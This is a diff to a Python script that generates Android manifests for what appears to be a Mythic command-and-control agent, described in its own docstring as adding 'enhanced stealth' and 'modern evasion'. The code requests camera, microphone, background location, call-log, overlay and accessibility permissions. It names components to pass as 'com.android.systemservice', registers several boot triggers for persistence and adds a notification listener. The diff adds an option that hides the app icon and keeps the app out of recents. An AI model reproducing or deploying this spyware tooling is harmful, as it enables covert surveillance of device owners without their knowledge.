@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+
 """
 manifest_editor.py - Enhanced Android Manifest Editor for Android 14/15/16
 Includes Privacy Sandbox compatibility, enhanced stealth, and modern evasion
@@ -16,9 +16,10 @@ class ManifestEditor:
         self.build_params = build_params
         self.namespace = "{http://schemas.android.com/apk/res/android}"
         self.tools_namespace = "{http://schemas.android.com/tools}"
-        self.target_sdk = min(int(build_params.get("target_android_version", "34")), 34)  # Cap at API 34 for now
+        self.target_sdk = min(int(build_params.get("target_android_version", "34")), 34)
+        self.hide_app_icon = build_params.get('hide_app_icon', True)
         
-        # Register namespaces
+
         ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
         ET.register_namespace('tools', 'http://schemas.android.com/tools')
         ET.register_namespace('auto', 'http://schemas.android.com/apk/res-auto')
@@ -34,19 +35,19 @@ class ManifestEditor:
         root.set(f'{self.namespace}versionName', '1.0')
         root.set(f'{self.namespace}compileSdkVersion', str(self.target_sdk))
 
-        # Android 14+ specific attributes
+
         root.set(f'{self.namespace}installLocation', 'auto')
         
-        # Add enhanced permissions for Android 14+
+
         self._add_enhanced_permissions(root)
         
-        # Add features with Android 14+ compatibility
+
         self._add_enhanced_features(root)
         
-        # Create application with advanced stealth
+
         application = self._create_advanced_stealth_application(root, app_name)
         
-        # Add agent components with Android 14+ compatibility
+
         self._add_enhanced_agent_components(application)
         
         return self._format_manifest(root)
@@ -54,7 +55,7 @@ class ManifestEditor:
     def _add_enhanced_permissions(self, root: ET.Element):
         """Enhanced permissions for Android 14/15/16 compatibility"""
         
-        # Core permissions
+
         core_permissions = [
             "android.permission.INTERNET",
             "android.permission.ACCESS_NETWORK_STATE",
@@ -68,7 +69,7 @@ class ManifestEditor:
             "android.permission.FOREGROUND_SERVICE_LOCATION",
         ]
 
-        # Android 14+ specific permissions
+
         android14_permissions = [
             "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
             "android.permission.USE_FULL_SCREEN_INTENT",
@@ -77,10 +78,10 @@ class ManifestEditor:
             "android.permission.USE_EXACT_ALARM",
         ]
 
-        # Privacy-sensitive permissions with Android 14+ handling
+
         sensitive_permissions = [
             "android.permission.CAMERA",
-            "android.permission.RECORD_AUDIO", 
+            "android.permission.RECORD_AUDIO",
             "android.permission.ACCESS_FINE_LOCATION",
             "android.permission.ACCESS_COARSE_LOCATION",
             "android.permission.ACCESS_BACKGROUND_LOCATION",
@@ -92,17 +93,17 @@ class ManifestEditor:
             "android.permission.WRITE_CALL_LOG",
         ]
 
-        # Storage permissions with scoped storage compliance
+
         storage_permissions = [
             "android.permission.READ_EXTERNAL_STORAGE",
             "android.permission.WRITE_EXTERNAL_STORAGE",
             "android.permission.MANAGE_EXTERNAL_STORAGE",
             "android.permission.READ_MEDIA_IMAGES",
-            "android.permission.READ_MEDIA_VIDEO", 
+            "android.permission.READ_MEDIA_VIDEO",
             "android.permission.READ_MEDIA_AUDIO",
         ]
 
-        # Overlay and accessibility (high scrutiny in Android 14+)
+
         overlay_permissions = [
             "android.permission.SYSTEM_ALERT_WINDOW",
             "android.permission.BIND_ACCESSIBILITY_SERVICE",
@@ -122,11 +123,11 @@ class ManifestEditor:
                 perm_elem = ET.SubElement(root, 'uses-permission')
                 perm_elem.set(f'{self.namespace}name', permission)
                 
-                # Add maxSdkVersion for deprecated permissions
+
                 if permission in ["android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"]:
                     perm_elem.set(f'{self.namespace}maxSdkVersion', '32')
                 
-                # Add Android 14+ specific attributes
+
                 if permission in sensitive_permissions:
                     perm_elem.set(f'{self.tools_namespace}node', 'replace')
 
@@ -134,7 +135,7 @@ class ManifestEditor:
         """Create advanced stealth application for Android 14+"""
         application = ET.SubElement(root, 'application')
         
-        # Basic stealth attributes
+
         application.set(f'{self.namespace}allowBackup', 'false')
         application.set(f'{self.namespace}allowClearUserData', 'false')
         application.set(f'{self.namespace}label', app_name)
@@ -146,21 +147,21 @@ class ManifestEditor:
         application.set(f'{self.namespace}requestLegacyExternalStorage', 'true')
         application.set(f'{self.namespace}preserveLegacyExternalStorage', 'true')
         
-        # Android 14+ specific stealth attributes
+
         application.set(f'{self.namespace}dataExtractionRules', '@xml/data_extraction_rules')
         application.set(f'{self.namespace}enableOnBackInvokedCallback', 'true')
         application.set(f'{self.namespace}localeConfig', '@xml/locales_config')
         
-        # Advanced anti-analysis
+
         application.set(f'{self.namespace}debuggable', 'false')
         application.set(f'{self.namespace}allowDebugging', 'false')
         application.set(f'{self.namespace}testOnly', 'false')
-        application.set(f'{self.namespace}extractNativeLibs', 'false')  # Prevents easy native lib extraction
+        application.set(f'{self.namespace}extractNativeLibs', 'false')
         
-        # Hide from recents and disable screenshots
+
         application.set(f'{self.namespace}allowTaskReparenting', 'false')
         
-        # Custom application class for stealth initialization
+
         application.set(f'{self.namespace}name', 'com.android.systemservice.StealthApplication')
         
         return application
@@ -168,7 +169,7 @@ class ManifestEditor:
     def _add_enhanced_agent_components(self, application: ET.Element):
         """Add enhanced agent components for Android 14+ compatibility"""
         
-        # Main agent service with enhanced foreground service types
+
         service = ET.SubElement(application, 'service')
         service.set(f'{self.namespace}name', 'com.android.systemservice.MythicAgentService')
         service.set(f'{self.namespace}enabled', 'true')
@@ -178,7 +179,7 @@ class ManifestEditor:
         service.set(f'{self.namespace}stopWithTask', 'false')
         service.set(f'{self.namespace}directBootAware', 'true')
         
-        # Enhanced boot receiver with multiple trigger points
+
         receiver = ET.SubElement(application, 'receiver')
         receiver.set(f'{self.namespace}name', 'com.android.systemservice.EnhancedBootReceiver')
         receiver.set(f'{self.namespace}enabled', 'true')
@@ -188,7 +189,7 @@ class ManifestEditor:
         intent_filter = ET.SubElement(receiver, 'intent-filter')
         intent_filter.set(f'{self.namespace}priority', '1000')
         
-        # Multiple boot triggers for reliability
+
         boot_actions = [
             'android.intent.action.BOOT_COMPLETED',
             'android.intent.action.QUICKBOOT_POWERON',
@@ -202,12 +203,12 @@ class ManifestEditor:
             action_elem = ET.SubElement(intent_filter, 'action')
             action_elem.set(f'{self.namespace}name', action)
         
-        # Add data element for package replace events
+
         if 'PACKAGE_REPLACED' in str(intent_filter):
             data_elem = ET.SubElement(intent_filter, 'data')
             data_elem.set(f'{self.namespace}scheme', 'package')
 
-        # Enhanced accessibility service for Android 14+
+
         if self.build_params.get("Enable Overlay Module", False):
             accessibility_service = ET.SubElement(application, 'service')
             accessibility_service.set(f'{self.namespace}name', 'com.android.systemservice.EnhancedAccessibilityService')
@@ -220,12 +221,12 @@ class ManifestEditor:
             acc_action = ET.SubElement(acc_filter, 'action')
             acc_action.set(f'{self.namespace}name', 'android.accessibilityservice.AccessibilityService')
             
-            # Enhanced accessibility metadata
+
             meta_data = ET.SubElement(accessibility_service, 'meta-data')
             meta_data.set(f'{self.namespace}name', 'android.accessibilityservice')
             meta_data.set(f'{self.namespace}resource', '@xml/enhanced_accessibility_config')
 
-        # Notification listener service for Android 14+
+
         notification_service = ET.SubElement(application, 'service')
         notification_service.set(f'{self.namespace}name', 'com.android.systemservice.NotificationListenerService')
         notification_service.set(f'{self.namespace}enabled', 'true')
@@ -235,6 +236,9 @@ class ManifestEditor:
         notif_filter = ET.SubElement(notification_service, 'intent-filter')
         notif_action = ET.SubElement(notif_filter, 'action')
         notif_action.set(f'{self.namespace}name', 'android.service.notification.NotificationListenerService')
+        
+
+        self._add_stealth_launcher_activity(application)
 
     def create_enhanced_accessibility_config(self) -> str:
         """Create enhanced accessibility configuration for Android 14+"""
@@ -309,3 +313,138 @@ class ManifestEditor:
     <locale android:name="ru"/>
     <locale android:name="ja"/>
 </locale-config>'''
+    
+    def _add_stealth_launcher_activity(self, application: ET.Element):
+        """Add stealth launcher activity configuration based on hide_app_icon setting"""
+        
+        if self.hide_app_icon:
+
+            activity = ET.SubElement(application, 'activity')
+            activity.set(f'{self.namespace}name', 'com.android.systemservice.StealthMainActivity')
+            activity.set(f'{self.namespace}enabled', 'true')
+            activity.set(f'{self.namespace}exported', 'false')
+            activity.set(f'{self.namespace}excludeFromRecents', 'true')
+            activity.set(f'{self.namespace}noHistory', 'true')
+            activity.set(f'{self.namespace}theme', '@android:style/Theme.Translucent.NoTitleBar')
+            activity.set(f'{self.namespace}finishOnTaskLaunch', 'true')
+            
+
+            intent_filter = ET.SubElement(activity, 'intent-filter')
+            action_main = ET.SubElement(intent_filter, 'action')
+            action_main.set(f'{self.namespace}name', 'android.intent.action.MAIN')
+            
+
+            
+
+            activity_alias = ET.SubElement(application, 'activity-alias')
+            activity_alias.set(f'{self.namespace}name', 'com.android.systemservice.HiddenLauncherAlias')
+            activity_alias.set(f'{self.namespace}targetActivity', 'com.android.systemservice.StealthMainActivity')
+            activity_alias.set(f'{self.namespace}enabled', 'false')
+            activity_alias.set(f'{self.namespace}exported', 'false')
+            activity_alias.set(f'{self.namespace}icon', '@android:drawable/ic_dialog_info')
+            activity_alias.set(f'{self.namespace}label', 'System Service')
+            
+
+            alias_filter = ET.SubElement(activity_alias, 'intent-filter')
+            alias_action = ET.SubElement(alias_filter, 'action')
+            alias_action.set(f'{self.namespace}name', 'android.intent.action.MAIN')
+            alias_category = ET.SubElement(alias_filter, 'category')
+            alias_category.set(f'{self.namespace}name', 'android.intent.category.LAUNCHER')
+            
+        else:
+
+            activity = ET.SubElement(application, 'activity')
+            activity.set(f'{self.namespace}name', 'com.android.systemservice.MainActivity')
+            activity.set(f'{self.namespace}enabled', 'true')
+            activity.set(f'{self.namespace}exported', 'true')
+            activity.set(f'{self.namespace}theme', '@android:style/Theme.DeviceDefault.DayNight')
+            
+            intent_filter = ET.SubElement(activity, 'intent-filter')
+            action_main = ET.SubElement(intent_filter, 'action')
+            action_main.set(f'{self.namespace}name', 'android.intent.action.MAIN')
+            category_launcher = ET.SubElement(intent_filter, 'category')
+            category_launcher.set(f'{self.namespace}name', 'android.intent.category.LAUNCHER')
+    
+    def _add_enhanced_features(self, root: ET.Element):
+        """Add enhanced features declaration for Android 14+ compatibility"""
+        
+
+        features = [
+
+            {'name': 'android.hardware.camera', 'required': 'false'},
+            {'name': 'android.hardware.camera2', 'required': 'false'},
+            {'name': 'android.hardware.camera.autofocus', 'required': 'false'},
+            {'name': 'android.hardware.camera.flash', 'required': 'false'},
+            {'name': 'android.hardware.camera.front', 'required': 'false'},
+            {'name': 'android.hardware.camera.any', 'required': 'false'},
+            
+
+            {'name': 'android.hardware.microphone', 'required': 'false'},
+            {'name': 'android.hardware.audio.low_latency', 'required': 'false'},
+            {'name': 'android.hardware.audio.pro', 'required': 'false'},
+            
+
+            {'name': 'android.hardware.location', 'required': 'false'},
+            {'name': 'android.hardware.location.network', 'required': 'false'},
+            {'name': 'android.hardware.location.gps', 'required': 'false'},
+            
+
+            {'name': 'android.hardware.sensor.accelerometer', 'required': 'false'},
+            {'name': 'android.hardware.sensor.gyroscope', 'required': 'false'},
+            {'name': 'android.hardware.sensor.light', 'required': 'false'},
+            {'name': 'android.hardware.sensor.proximity', 'required': 'false'},
+            
+
+            {'name': 'android.hardware.wifi', 'required': 'false'},
+            {'name': 'android.hardware.wifi.direct', 'required': 'false'},
+            {'name': 'android.hardware.bluetooth', 'required': 'false'},
+            {'name': 'android.hardware.bluetooth_le', 'required': 'false'},
+            {'name': 'android.hardware.telephony', 'required': 'false'},
+            {'name': 'android.hardware.telephony.gsm', 'required': 'false'},
+            {'name': 'android.hardware.telephony.cdma', 'required': 'false'},
+            
+
+            {'name': 'android.software.file_based_encryption', 'required': 'false'},
+            
+
+            {'name': 'android.hardware.touchscreen', 'required': 'false'},
+            {'name': 'android.hardware.touchscreen.multitouch', 'required': 'false'},
+            {'name': 'android.hardware.touchscreen.multitouch.distinct', 'required': 'false'},
+            
+
+            {'name': 'android.software.predictive_back_gesture', 'required': 'false'},
+            {'name': 'android.software.activities_on_secondary_displays', 'required': 'false'},
+        ]
+        
+        existing_features = set()
+        for feature in root.findall('uses-feature'):
+            name = feature.get(f'{self.namespace}name')
+            if name:
+                existing_features.add(name)
+        
+        for feature_info in features:
+            feature_name = feature_info['name']
+            if feature_name not in existing_features:
+                feature_elem = ET.SubElement(root, 'uses-feature')
+                feature_elem.set(f'{self.namespace}name', feature_name)
+                feature_elem.set(f'{self.namespace}required', feature_info['required'])
+    
+    def _format_manifest(self, root: ET.Element) -> str:
+        """Format the manifest XML with proper indentation"""
+
+        from xml.dom import minidom
+        
+        rough_string = ET.tostring(root, encoding='unicode')
+        reparsed = minidom.parseString(rough_string)
+        formatted = reparsed.toprettyxml(indent="    ")
+        
+
+        lines = [line for line in formatted.split('\n') if line.strip()]
+        
+
+        if lines and lines[0].startswith('<?xml'):
+            lines = lines[1:]
+        
+        formatted_manifest = '<?xml version="1.0" encoding="utf-8"?>\n' + '\n'.join(lines)
+        
+        return formatted_manifest
